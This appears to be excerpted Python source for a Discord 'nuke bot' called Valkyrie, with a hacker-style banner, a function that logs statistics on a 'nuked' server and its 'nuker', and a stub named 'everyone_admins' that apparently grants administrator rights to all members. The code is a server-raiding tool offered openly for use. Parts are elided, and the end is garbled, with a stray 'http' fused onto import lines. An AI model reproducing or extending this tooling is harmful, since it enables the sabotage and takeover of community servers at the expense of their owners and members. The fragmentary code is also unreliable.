...
banner = f'''
            {r} __      __   _ _               _      {m}  ____        _   
            {r} \ \    / /  | | |             (_)     {m} |  _ \      | |  
            {r}  \ \  / __ _| | | ___   _ _ __ _  ___ {m} | |_) | ___ | |_ 
            {r}   \ \/ / _` | | |/ | | | | '__| |/ _ \{m} |  _ < / _ \| __|
            {r}    \  | (_| | |   <| |_| | |  | |  __/{m} | |_) | (_) | |_ 
             {r}    \/ \__,_|_|_|\_\\__,  |_|  |_|\___|{m} |____/ \___/ \__|
            {r}                      __/ |                              
            {r}                     |___/                               


                {Fore.RED}Written on: {c}Python 3.8, discord.py 1.7.3
                {Fore.RED}Made by: {c}https://github.com/ArMaGeDDoN-SS
                {Fore.RED}GitHub: {c}https://github.com/ArMaGeDDoN-SS/Discord-Nuke-Bot
                {Fore.RED}Thanks: {c}N7tr


  {Fore.RED}CommandName                  {Fore.RED}Description{wh}
...
async def console_log_send(ctx):
    try:
        text = f"""
{Fore.RED}Valkyrie {wh}|{Fore.RED} Nuked server "{wh}{ctx.guild.name}{Fore.RED}"

{Fore.RED}[logs] {wh}Server ID: {wh}{ctx.guild.id}
{Fore.RED}[logs] {wh}Owner: {wh}{ctx.guild.owner}
{Fore.RED}[logs] {wh}All users: {wh}{len(ctx.guild.members)}
{Fore.RED}[logs] {wh}All channels: {wh}{len(ctx.guild.channels)}
{Fore.RED}[logs] {wh}All roles: {wh}{len(ctx.guild.roles)}
{Fore.RED}[logs] {wh}Nuker: {wh}{ctx.author}

{Fore.RED}[logs] {wh}Text Channels: {wh}{len(ctx.guild.text_channels)}
{Fore.RED}[logs] {wh}Voice Channels: {wh}{len(ctx.guild.voice_channels)}
{Fore.RED}[logs] {wh}Categories: {wh}{len(ctx.guild.categories)}

{Fore.RED}[logs] {wh}All users: {wh}{len(ctx.guild.members)}
{Fore.RED}[logs] {wh}People: {wh}{len([m for m in ctx.guild.members if not m.bot])}
{Fore.RED}[logs] {wh}Bots: {wh}{len([m for m in ctx.guild.members if m.bot])}
{Fore.RED}[logs] {wh}Administrators: {wh}{len([m for m in ctx.guild.members if m.guild_permissions.administrator])}
{Fore.RED}[logs] {wh}Moderators: {wh}{len([m for m in ctx.guild.members if m.guild_permissions.kick_members])}

{Fore.RED}[logs] {wh}All roles: {wh}{len(ctx.guild.roles)}
{Fore.RED}[logs] {wh}Moderation roles: {wh}{len([r for r in ctx.guild.roles if r.permissions.kick_members])}
{Fore.RED}[logs] {wh}Administration roles: {wh}{len([r for r in ctx.guild.roles if r.permissions.administrator])}
"""
        print(text)
...
async def everyone_admins(ctx):
    ...
    toc = time.perf_counter()
    print(f"[time] Everyone administrator: {toc - tic:0.4f} sec")http
import asyncio
import discord
import datetime
